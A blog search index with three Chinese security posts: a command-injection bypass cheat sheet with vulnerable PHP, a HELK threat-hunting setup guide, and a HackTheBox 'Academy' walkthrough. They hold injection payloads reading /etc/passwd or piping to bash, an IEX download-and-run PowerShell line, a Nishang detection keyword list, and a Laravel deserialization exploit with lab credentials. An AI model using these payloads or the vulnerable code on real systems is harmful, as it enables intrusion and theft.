<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Command Injection Bypass</title>
    <url>/2020/09/06/Command-Injection-Bypass/</url>
    <content><![CDATA[<h1 id="命令注入常见绕过"><a href="#命令注入常见绕过" class="headerlink" title="命令注入常见绕过"></a>命令注入常见绕过</h1><p>测试环境为php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;test.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;p&gt;Command: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;cmd&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $a&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">  system($a);</span><br><span class="line">  echo &quot;Command is :&quot;.$a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1空格绕过"><a href="#1空格绕过" class="headerlink" title="1空格绕过"></a>1空格绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$IFS&#x2F;etc&#x2F;passwd</span><br><span class="line">cat&lt;&#x2F;etc&#x2F;passwd</span><br><span class="line">cat%09&#x2F;etc&#x2F;passwd		需要php环境</span><br><span class="line">cat%20&#x2F;etc&#x2F;passwd		URL编码空格</span><br></pre></td></tr></table></figure>

<h2 id="2命令拼接"><a href="#2命令拼接" class="headerlink" title="2命令拼接"></a>2命令拼接</h2><table>
<thead>
<tr>
<th>拼接符号</th>
<th>逻辑</th>
<th>执行情况</th>
</tr>
</thead>
<tbody><tr>
<td>A&amp;B</td>
<td>A和B都会执行</td>
<td>都会回显</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>A执行成功，才会执行B</td>
<td>都会回显</td>
</tr>
<tr>
<td>A|B</td>
<td>A的输出作为B的输入</td>
<td>AB都会执行，只回显B</td>
</tr>
<tr>
<td>A||B</td>
<td>A执行失败，才会执行B;A执行成功，不执行B</td>
<td>执行正确语句，回显正确的语句</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>字符</th>
<th>url编码</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>%26</td>
</tr>
<tr>
<td>|</td>
<td>%7c</td>
</tr>
<tr>
<td>%</td>
<td>%25</td>
</tr>
<tr>
<td>;</td>
<td>%3b</td>
</tr>
<tr>
<td>空格</td>
<td>%20</td>
</tr>
<tr>
<td>#</td>
<td>%23</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami%0awhoami				php环境，%0a表示换行符</span><br></pre></td></tr></table></figure>

<h2 id="3后缀截断"><a href="#3后缀截断" class="headerlink" title="3后缀截断"></a>3后缀截断</h2><p>#号截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMMAND%20%23</span><br></pre></td></tr></table></figure>

<p>00截断PHP&lt;5.3.29</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMMAND%00</span><br></pre></td></tr></table></figure>

<h3 id="4黑名单"><a href="#4黑名单" class="headerlink" title="4黑名单"></a>4黑名单</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo+&quot;aWQ%3d&quot;|base64+-d+|bash</span><br><span class="line">\i\d</span><br><span class="line">a&#x3D;i;b&#x3D;d;$a$b</span><br></pre></td></tr></table></figure>

<p>php chr()函数</p>
<p>ASCII</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo chr(61) . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 十进制</span><br><span class="line">echo chr(061) . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 八进制值</span><br><span class="line">echo chr(0x61) . &quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 十六进制值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Hunting ELK初探</title>
    <url>/2021/01/29/HELK/</url>
    <content><![CDATA[<p><img src="/images/HELK/HELK-Design.png" alt="HELK-Design"></p>
<p>HutingELK是个基于ELK开源的具有高级分析功能的漏洞挖掘平台，这里主要用它来完成蓝队的工作</p>
<h1 id="架构简介"><a href="#架构简介" class="headerlink" title="架构简介"></a>架构简介</h1><p>ELK</p>
<p>Elasticsearch:一个搜索引擎，这里可以理解为数据库<br>Logstash:收集日志，并存入数据库<br>Kibana:将数据库内容web图形化</p>
<p>其他</p>
<p>Elastalert:检索数据库的内容，实时的发出警告<br>winlogbeat:windows的监控软件<br>kafka:数据分发</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>最好给虚拟机的内存开到6G以上，会出现各种神奇的问题以及卡顿</p>
<p>下载和运行安装程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Cyb3rWard0g&#x2F;HELK.git</span><br><span class="line">cd  HELK&#x2F;docker</span><br></pre></td></tr></table></figure>

<p>在运行安装程序后，可以监控日志，防止出现安装错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -f &#x2F;var&#x2F;log&#x2F;helk-install.log</span><br></pre></td></tr></table></figure>

<p>安装之前，可以修改一下elasticsearch的内存配置，按照官方说法，测试用5G就行</p>
<p>修改<code>HELK/docker/helk-elasticsearch/config/jvm.options</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms6g</span><br><span class="line">-Xmx6g</span><br></pre></td></tr></table></figure>

<p>之后的完整安装过程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./helk_install.sh</span><br><span class="line">uthor: Roberto Rodriguez (@Cyb3rWard0g)  **</span><br><span class="line">** HELK build version: v0.1.9-alpha10082020 **</span><br><span class="line">** HELK ELK version: 7.6.2     **</span><br><span class="line">** License: GPL-3.0                          **</span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">[HELK-INSTALLATION-INFO] HELK hosted on a Linux box</span><br><span class="line">[HELK-INSTALLATION-INFO] Available Memory: 7035 MBs</span><br><span class="line">[HELK-INSTALLATION-INFO] You&#x27;re using kali version 2020.3</span><br><span class="line"></span><br><span class="line">*****************************************************</span><br><span class="line">*      HELK - Docker Compose Build Choices          *</span><br><span class="line">*****************************************************</span><br><span class="line"></span><br><span class="line">1. KAFKA + KSQL + ELK + NGNIX</span><br><span class="line">2. KAFKA + KSQL + ELK + NGNIX + ELASTALERT</span><br><span class="line">3. KAFKA + KSQL + ELK + NGNIX + SPARK + JUPYTER</span><br><span class="line">4. KAFKA + KSQL + ELK + NGNIX + SPARK + JUPYTER + ELASTALERT</span><br><span class="line"></span><br><span class="line">Enter build choice [ 1 - 4]: 2					#选择2安装ELASTALERT</span><br><span class="line">[HELK-INSTALLATION-INFO] HELK build set to 2</span><br><span class="line">[HELK-INSTALLATION-INFO] Set HELK IP. Default value is your current IP: 192.168.110.3		#绑定IP</span><br><span class="line">[HELK-INSTALLATION-INFO] HELK IP set to 192.168.110.3</span><br><span class="line">[HELK-INSTALLATION-INFO] Please make sure to create a custom Kibana password and store it securely for future use.</span><br><span class="line">[HELK-INSTALLATION-INFO] Set HELK Kibana UI Password: hunting			#设置登录密码</span><br><span class="line">[HELK-INSTALLATION-INFO] Verify HELK Kibana UI Password: hunting</span><br><span class="line">[HELK-INSTALLATION-INFO] Docker already installed</span><br><span class="line">[HELK-INSTALLATION-INFO] Checking if it is installed via snap..</span><br><span class="line">[HELK-INSTALLATION-INFO] Assesing if Docker is running..</span><br><span class="line">[HELK-INSTALLATION-ERROR] Docker is not running. Attempting to start it..</span><br><span class="line">Synchronizing state of docker.service with SysV service script with /lib/systemd/systemd-sysv-install.</span><br><span class="line">Executing: /lib/systemd/systemd-sysv-install enable docker</span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/docker.service → /lib/systemd/system/docker.service.</span><br><span class="line">[HELK-INSTALLATION-INFO] Docker is running</span><br><span class="line">[HELK-INSTALLATION-INFO] Making sure you assigned enough disk space to the current Docker base directory</span><br><span class="line">[HELK-INSTALLATION-INFO] Available Docker Disk: 77 GBs</span><br><span class="line">[HELK-INSTALLATION-INFO] Checking local vm.max_map_count variable and setting it to 4120294</span><br><span class="line">[HELK-INSTALLATION-INFO] Setting local vm.swappiness variable to 25</span><br><span class="line">[HELK-INSTALLATION-INFO] Building &amp; running HELK from helk-kibana-analysis-alert-basic.yml file..</span><br><span class="line">[HELK-INSTALLATION-INFO] Waiting for some services to be up .....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line">** [HELK-INSTALLATION-INFO] HELK WAS INSTALLED SUCCESSFULLY                      **</span><br><span class="line">** [HELK-INSTALLATION-INFO] USE THE FOLLOWING SETTINGS TO INTERACT WITH THE HELK **</span><br><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">HELK KIBANA URL: https://192.168.110.3</span><br><span class="line">HELK KIBANA USER: helk</span><br><span class="line">HELK KIBANA PASSWORD: hunting</span><br><span class="line">HELK ZOOKEEPER: 192.168.110.3:2181</span><br><span class="line">HELK KSQL SERVER: 192.168.110.3:8088</span><br><span class="line"></span><br><span class="line">IT IS HUNTING SEASON!!!!!</span><br><span class="line"></span><br><span class="line">You can stop all the HELK docker containers by running the following command:</span><br><span class="line"> [+] sudo docker-compose -f helk-kibana-analysis-alert-basic.yml stop</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装完成后，就可以访问80端口，用户名和密码为<code>helk/hunting</code></p>
<p>简单规则探索</p>
<p>我们可以查看运行的容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps |less -S</span><br><span class="line"></span><br><span class="line">docker ps | awk &#39;&#123;print $NF&#125;&#39;        </span><br><span class="line">NAMES</span><br><span class="line">helk-ksql-cli</span><br><span class="line">helk-ksql-server</span><br><span class="line">helk-kafka-broker</span><br><span class="line">helk-zookeeper</span><br><span class="line">helk-elastalert</span><br><span class="line">helk-logstash</span><br><span class="line">helk-nginx</span><br><span class="line">helk-kibana</span><br><span class="line">helk-elasticsearch</span><br></pre></td></tr></table></figure>

<p><img src="/images/HELK/1.png" alt="1"></p>
<h2 id="logstash"><a href="#logstash" class="headerlink" title="logstash"></a>logstash</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it helk-logstash &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>在<code>/usr/share/logstash/pipeline</code>存放了规则文件</p>
<p><img src="/images/HELK/2.png" alt="2"></p>
<p>注意这里文件名，前面有个数字，logstash会按照数字顺序进行逐一匹配。命中这些规则后，就会发往Elasticsearch</p>
<h2 id="elastalert"><a href="#elastalert" class="headerlink" title="elastalert"></a>elastalert</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it helk-elastalert &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>在<code>/opt/sigma/rules</code>存放了规则文件</p>
<p><img src="/images/HELK/3.png" alt="3"></p>
<p>比如捕获Nishang攻击的规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: Malicious Nishang PowerShell Commandlets</span><br><span class="line">id: f772cee9-b7c2-4cb2-8f07-49870adc02e0</span><br><span class="line">status: experimental</span><br><span class="line">description: Detects Commandlet names and arguments from the Nishang exploitation framework</span><br><span class="line">date: 2019&#x2F;05&#x2F;16</span><br><span class="line">references:</span><br><span class="line">    - https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang</span><br><span class="line">tags:</span><br><span class="line">    - attack.execution</span><br><span class="line">    - attack.t1059.001</span><br><span class="line">    - attack.t1086  #an old one</span><br><span class="line">author: Alec Costello</span><br><span class="line">logsource:</span><br><span class="line">    product: windows</span><br><span class="line">    service: powershell</span><br><span class="line">    definition: It is recommanded to use the new &quot;Script Block Logging&quot; of PowerShell v5 https:&#x2F;&#x2F;adsecurity.org&#x2F;?p&#x3D;2277</span><br><span class="line">detection:</span><br><span class="line">    keywords:</span><br><span class="line">        - Add-ConstrainedDelegationBackdoor</span><br><span class="line">        - Set-DCShadowPermissions</span><br><span class="line">        - DNS_TXT_Pwnage</span><br><span class="line">        - Execute-OnTime</span><br><span class="line">        - HTTP-Backdoor</span><br><span class="line">        - Set-RemotePSRemoting</span><br><span class="line">        - Set-RemoteWMI</span><br><span class="line">        - Invoke-AmsiBypass</span><br><span class="line">        - Out-CHM</span><br><span class="line">        - Out-HTA</span><br><span class="line">        - Out-SCF</span><br><span class="line">        - Out-SCT</span><br><span class="line">        - Out-Shortcut</span><br><span class="line">        - Out-WebQuery</span><br><span class="line">        - Out-Word</span><br><span class="line">        - Enable-Duplication</span><br><span class="line">        - Remove-Update</span><br><span class="line">        - Download-Execute-PS</span><br><span class="line">        - Download_Execute</span><br><span class="line">        - Execute-Command-MSSQL</span><br><span class="line">        - Execute-DNSTXT-Code</span><br><span class="line">        - Out-RundllCommand</span><br><span class="line">        - Copy-VSS</span><br><span class="line">        - FireBuster</span><br><span class="line">        - FireListener</span><br><span class="line">        - Get-Information</span><br><span class="line">        - Get-PassHints</span><br><span class="line">        - Get-WLAN-Keys</span><br><span class="line">        - Get-Web-Credentials</span><br><span class="line">        - Invoke-CredentialsPhish</span><br><span class="line">        - Invoke-MimikatzWDigestDowngrade</span><br><span class="line">        - Invoke-SSIDExfil</span><br><span class="line">        - Invoke-SessionGopher</span><br><span class="line">        - Keylogger</span><br><span class="line">        - Invoke-Interceptor</span><br><span class="line">        - Create-MultipleSessions</span><br><span class="line">        - Invoke-NetworkRelay</span><br><span class="line">        - Run-EXEonRemote</span><br><span class="line">        - Invoke-Prasadhak</span><br><span class="line">        - Invoke-BruteForce</span><br><span class="line">        - Password-List</span><br><span class="line">        - Invoke-JSRatRegsvr</span><br><span class="line">        - Invoke-JSRatRundll</span><br><span class="line">        - Invoke-PoshRatHttps</span><br><span class="line">        - Invoke-PowerShellIcmp</span><br><span class="line">        - Invoke-PowerShellUdp</span><br><span class="line">        - Invoke-PSGcat</span><br><span class="line">        - Invoke-PsGcatAgent</span><br><span class="line">        - Remove-PoshRat</span><br><span class="line">        - Add-Persistance</span><br><span class="line">        - ExetoText</span><br><span class="line">        - Invoke-Decode</span><br><span class="line">        - Invoke-Encode</span><br><span class="line">        - Parse_Keys</span><br><span class="line">        - Remove-Persistence</span><br><span class="line">        - StringtoBase64</span><br><span class="line">        - TexttoExe</span><br><span class="line">        - Powerpreter</span><br><span class="line">        - Nishang</span><br><span class="line">        - EncodedData</span><br><span class="line">        - DataToEncode</span><br><span class="line">        - LoggedKeys</span><br><span class="line">        - OUT-DNSTXT</span><br><span class="line">        - Jitter</span><br><span class="line">        - ExfilOption</span><br><span class="line">        - Tamper</span><br><span class="line">        - DumpCerts</span><br><span class="line">        - DumpCreds</span><br><span class="line">        - Shellcode32</span><br><span class="line">        - Shellcode64</span><br><span class="line">        - NotAllNameSpaces</span><br><span class="line">        - exfill</span><br><span class="line">        - FakeDC</span><br><span class="line">        - Exploit</span><br><span class="line">    condition: keywords</span><br><span class="line">falsepositives:</span><br><span class="line">    - Penetration testing</span><br><span class="line">level: high</span><br></pre></td></tr></table></figure>

<h1 id="windows客户端配置"><a href="#windows客户端配置" class="headerlink" title="windows客户端配置"></a>windows客户端配置</h1><h2 id="sysmon"><a href="#sysmon" class="headerlink" title="sysmon"></a>sysmon</h2><p>准备在windows上安装sysmon，不过在此之前，我们可以先去寻找一些配置好的规则文件:<a href="https://github.com/olafhartong/sysmon-modular">链接</a></p>
<p>管理sysmon的规则文件是个非常痛苦的事情，它的规则文件非常多，而该项目以模块化，让我们能可以挑选想要的功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&gt; git clone https:&#x2F;&#x2F;github.com&#x2F;olafhartong&#x2F;sysmon-modular.git</span><br><span class="line">$&gt; cd sysmon modular</span><br><span class="line">$&gt; . .\Merge-SysmonXml.ps1</span><br><span class="line">$&gt; Merge-AllSysmonXml -Path ( Get-ChildItem &#39;[0-9]*\*.xml&#39;) -AsString | Out-File sysmonconfig.xml</span><br><span class="line">#这里我们选择所有的xml</span><br></pre></td></tr></table></figure>

<p>这里的新生成的<code>sysmonconfig.xml</code>就是我们期望的</p>
<p>接下来准备下载sysmon，可以去微软官网下载，或者在SysinternalsSuite全家桶里就有</p>
<p>把<code>sysmonconfig.xml</code>和sysmon放在同一目录下，执行命令安装服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\BypassAV\Desktop\Sysmon&gt;Sysmon64.exe -i sysmonconfig.xml</span><br><span class="line"></span><br><span class="line">﻿</span><br><span class="line">System Monitor v13.01 - System activity monitor</span><br><span class="line">Copyright (C) 2014-2021 Mark Russinovich and Thomas Garnier</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">Loading configuration file with schema version 4.50</span><br><span class="line">Configuration file validated.</span><br><span class="line">Sysmon64 installed.</span><br><span class="line">SysmonDrv installed.</span><br><span class="line">Starting SysmonDrv.</span><br><span class="line">SysmonDrv started.</span><br><span class="line">Starting Sysmon64..</span><br><span class="line">Sysmon64 started</span><br><span class="line"></span><br><span class="line">C:\Users\BypassAV\Desktop\Sysmon&gt;sc qc Sysmon64</span><br><span class="line">[SC] QueryServiceConfig 成功</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Sysmon64</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START								#服务已经配置为自启动</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\Sysmon64.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Sysmon64</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<p>安装完成后可以在eventvwr中:应用程序和服务日志→Microsoft→Windows→Sysmon→Operational  进行查看</p>
<h2 id="其他日志"><a href="#其他日志" class="headerlink" title="其他日志"></a>其他日志</h2><p>除了sysmon，还要获取其他日志</p>
<p>打开mmc→文件→添加/删除管理单元→本地计算机策略</p>
<p><img src="/images/HELK/4.png" alt="4"></p>
<p>开启记录进程创建日志(可以用来记录CMD命令)</p>
<p><img src="/images/HELK/5.png" alt="5"></p>
<p>开启:审核: 强制审核策略子类别设置(Windows Vista 或更高版本)可替代审核策略类别设置(防止旧的传统类别策略覆盖审核策略子类别)</p>
<p><img src="/images/HELK/6.png" alt="6"></p>
<p>开启:在过程创建事件中加入命令行(配合之前的审核进程创建日志，输出更详细的信息)</p>
<p><img src="/images/HELK/7.png" alt="7"></p>
<p>开启powershell日志</p>
<p><img src="/images/HELK/8.png" alt="8"></p>
<p>开启powershell脚本日志</p>
<p><img src="/images/HELK/9.png" alt="9"></p>
<p>其余的两项powershell设置不用管，分别是</p>
<p>打开powershell转换:将powershell脚本的输出，保存到一个目录(这里使用日志，就不需要它了)<br>启用脚本执行:限制一些powershell脚本的运作，如只允许运行签名后的powershell脚本运行</p>
<p>最后创建profile.ps1(profile.ps1是powershell的配置文件，会在启动powershell时加载)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$LogCommandLifeCycleEvent&#x3D;$true		#记录命令的开始和结束</span><br><span class="line">$LogCommandHealthEvent&#x3D;$true		#记录错误的命令</span><br></pre></td></tr></table></figure>

<p>放在$PSHOME(即C:\Windows\System32\WindowsPowerShell\v1.0)</p>
<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>打开taskschd.msc，开启所有任务历史记录</p>
<p><img src="/images/HELK/10.png" alt="10"></p>
<h2 id="安装winlogbeat"><a href="#安装winlogbeat" class="headerlink" title="安装winlogbeat"></a>安装winlogbeat</h2><p>设置winlogbeat.yml，内容如下(需要修改运行kafka的IP地址)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###################### Winlogbeat Configuration Example #########################</span><br><span class="line"># Winlogbeat 6, 7, and 8 are currently supported!</span><br><span class="line"># You can download the latest stable version of winlogbeat here:</span><br><span class="line"># https:&#x2F;&#x2F;www.elastic.co&#x2F;downloads&#x2F;beats&#x2F;winlogbeat</span><br><span class="line"></span><br><span class="line"># For simplicity&#x2F;brevity we have only enabled the options necessary for sending windows logs to HELK.</span><br><span class="line"># Please visit the Elastic documentation for the complete details of each option and full reference config:</span><br><span class="line"># https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;beats&#x2F;winlogbeat&#x2F;current&#x2F;winlogbeat-reference-yml.html</span><br><span class="line"></span><br><span class="line">#-------------------------- Windows Logs To Collect -----------------------------</span><br><span class="line">winlogbeat.event_logs:</span><br><span class="line">  - name: Application</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Security</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: System</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Microsoft-windows-sysmon&#x2F;operational</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Microsoft-windows-PowerShell&#x2F;Operational</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">    event_id: 4103, 4104</span><br><span class="line">  - name: Windows PowerShell</span><br><span class="line">    event_id: 400,600</span><br><span class="line">    ignore_older: 30m</span><br><span class="line">  - name: Microsoft-Windows-WMI-Activity&#x2F;Operational</span><br><span class="line">    event_id: 5857,5858,5859,5860,5861</span><br><span class="line"></span><br><span class="line">#----------------------------- Kafka output --------------------------------</span><br><span class="line">output.kafka:</span><br><span class="line">  # initial brokers for reading cluster metadata</span><br><span class="line">  # Place your HELK IP(s) here (keep the port).</span><br><span class="line">  # If you only have one Kafka instance (default for HELK) then remove the 2nd IP that has port 9093</span><br><span class="line">  hosts: [&quot;192.168.110.3:9092&quot;]</span><br><span class="line">  topic: &quot;winlogbeat&quot;</span><br><span class="line">  ############################# HELK Optimizing Latency ######################</span><br><span class="line">  max_retries: 2</span><br><span class="line">  max_message_bytes: 1000000</span><br></pre></td></tr></table></figure>

<h1 id="HELK"><a href="#HELK" class="headerlink" title="HELK"></a>HELK</h1><p>之后访问sysmon dashboard</p>
<p><img src="/images/HELK/13.png" alt="13"></p>
<p>成功运行了，但缺失了一些东西，我安装的sysmon版本为v13.01，和手册上的版本不太一样，不确定是不是其他地方可能出现的问题，但是没有影响到我之后的使用</p>
<p>接下来就是对过滤器的使用，比如我们在黑客在受害者的机器上创建了用户test，我们在helk上过滤<code>process_parent_command_line</code>可以看到</p>
<p><img src="/images/HELK/14.png" alt="14"></p>
<p>打开之后可以获得更多信息</p>
<p><img src="/images/HELK/15.png" alt="15"></p>
<h2 id="小测试"><a href="#小测试" class="headerlink" title="小测试"></a>小测试</h2><p>假设攻击者通过某个手段获取<strong>reverse shell</strong>，执行命令<code>iex(new-object net.webclient).downloadString(&#39;http://192.168.110.3:9001/winpriv/Sherlock.ps1&#39;);Find-AllVulns</code>通过sherlock，完成kernel exploit攻击，之后想要使用<code>mimikatz</code>进行后渗透攻击</p>
<p>显示<strong>event_original_message</strong>字段</p>
<p>发现了加载远程ps1脚本</p>
<p><img src="/images/HELK/16.png" alt="16"></p>
<p>发现mimikatz的传输和运行<br>另外也可以在另一个地方发现mimikatz调用了SeDebugPrivilege</p>
<p><img src="/images/HELK/17.png" alt="17"></p>
<h2 id="elasticalert"><a href="#elasticalert" class="headerlink" title="elasticalert"></a>elasticalert</h2><p>查看<strong>Rulename</strong>可以发现一警告，比如我们创建服务触发了<code>elasticalert</code>有关服务的规则</p>
<p><img src="/images/HELK/18.png" alt="18"></p>
<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>加固HELK，向生产环境靠近 (modsecurity，反向代理，HTTPS，Linux服务器加固…)</p>
<p>logstash、elastalert规则编写</p>
]]></content>
      <categories>
        <category>BlueTeam</category>
      </categories>
      <tags>
        <tag>EDR</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Academy</title>
    <url>/2020/11/28/HTB-Academy/</url>
    <content><![CDATA[<h1 id="Academy"><a href="#Academy" class="headerlink" title="Academy"></a>Academy</h1><p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Academy/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>目录枚举</p>
<p><img src="/images/Academy/2.png" alt="2"></p>
<p>发现了几个重要的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.php			登录页面</span><br><span class="line">register.php		注册页面</span><br><span class="line">admin.php			疑似后台登录</span><br><span class="line">config.php			空白</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>先注册账号进去</p>
<p><img src="/images/Academy/3.png" alt="3"></p>
<p>看起来网站内容还挺多，检查了主页半天， 没发现什么奇怪的点。开启burpsuite重新检查每一个请求，有了发现</p>
<p>注册页面提交了roleid参数，疑似跟身份权限有关</p>
<p><img src="/images/Academy/4.png" alt="4"></p>
<p>修改为1然后提交，尝试登录后台admin.php</p>
<p><img src="/images/Academy/5.png" alt="5"></p>
<p>登录成功，提示了新域名存在问题，添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.215    academy.htb dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>

<p>页面存在很多信息泄露，看来个测试页</p>
<p><img src="/images/Academy/6.png" alt="6"></p>
<p>从中得到了目标网站运行着Laravel(php框架)，并且泄露了APP_KEY。APP_KEY应该是Laravel中某些地方加密用到的密钥，比如cookie。</p>
<p>寻找漏洞</p>
<p><img src="/images/Academy/7.png" alt="7"></p>
<p>发现了msf可以使用的RCE，根据描述来看</p>
<p>这是一个反序列化漏洞，可以在http头X-XSRF-TOKEN中注入payload，前提是知道app_key，需要用它来进行加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set APP_KEY dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;</span><br><span class="line">set RHOST 10.10.10.215</span><br><span class="line">set VHOST dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure>

<p>别忘了设置vhost</p>
<p><img src="/images/Academy/8.png" alt="8"></p>
<p>这个payload的http请求如下</p>
<p><img src="/images/Academy/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>存在的用户</p>
<p><img src="/images/Academy/10.png" alt="10"></p>
<h3 id="user1"><a href="#user1" class="headerlink" title="user1"></a>user1</h3><p>机器存在3306端口，尝试寻找数据库连接凭据。在laravel中一般存储在.env</p>
<p><img src="/images/Academy/11.png" alt="11"></p>
<p>数据库登不上去，尝试密码复用</p>
<p><code>cry0l1t3/mySup3rP4s5w0rd!!</code></p>
<p><img src="/images/Academy/13.png" alt="13"></p>
<p>不过用户没有sudo权限</p>
<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>用户1的组有点意思，属于adm</p>
<p><img src="/images/Academy/14.png" alt="14"></p>
<p>adm组用于监视系统任务，可以读取/var/log下的许多日志，下一步应该检查那里</p>
<p>这里发现了目录audit。SELinux 预设会透过 Linux 审计系统 auditd将日志写在 /var/log/audit/audit.log。它会记录一些如系统调用，文件修改，执行的程序，系统登入登出等有关安全的操作事件。</p>
<p>这里好累，日志太多了，这里有描述的意思</p>
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-understanding_audit_log_files</a></p>
<p><a href="https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details">https://wiki.gentoo.org/wiki/SELinux/Tutorials/Where_to_find_SELinux_permission_denial_details</a></p>
<p>慢慢找呗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat * |grep &quot;[^a]uid&#x3D;100[01234]&quot;|grep &quot;type&#x3D;TTY&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Academy/15.png" alt="15"></p>
<p>发现auditd竟然记下来用户的凭据</p>
